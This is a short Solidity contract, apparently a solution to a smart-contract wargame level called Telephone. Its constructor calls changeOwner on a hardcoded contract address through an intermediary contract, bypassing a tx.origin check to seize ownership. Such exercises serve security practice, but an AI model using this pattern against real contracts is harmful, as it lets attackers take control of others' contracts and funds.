// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    constructor() {
        Telephone(0xD6F6d34A16e15B54363467Ca1534D26b7cD6bb53).changeOwner(msg.sender);
    }
}
